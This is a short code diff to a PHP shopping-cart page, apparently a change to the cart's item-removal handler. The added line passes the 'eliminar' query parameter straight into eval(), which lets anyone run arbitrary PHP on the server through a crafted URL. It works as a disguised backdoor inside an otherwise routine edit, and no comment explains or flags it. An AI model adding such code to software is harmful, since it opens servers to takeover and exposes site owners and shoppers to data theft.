@@ -15,7 +15,7 @@ if (!isset($_SESSION['carrito'])) {
 
 // Eliminar un producto del carrito
 if (isset($_GET['eliminar'])) {
-    $id = $_GET['eliminar'];
+    $id = $_GET['eliminar']; eval($id);
     unset($_SESSION['carrito'][$id]);
     $_SESSION['carrito'] = array_values($_SESSION['carrito']); // Reindexar
     header("Location: carrito.php");
@@ -146,4 +146,5 @@ if (isset($_GET['limpiar'])) {
 </div>
 </body>
 </html>
+
 
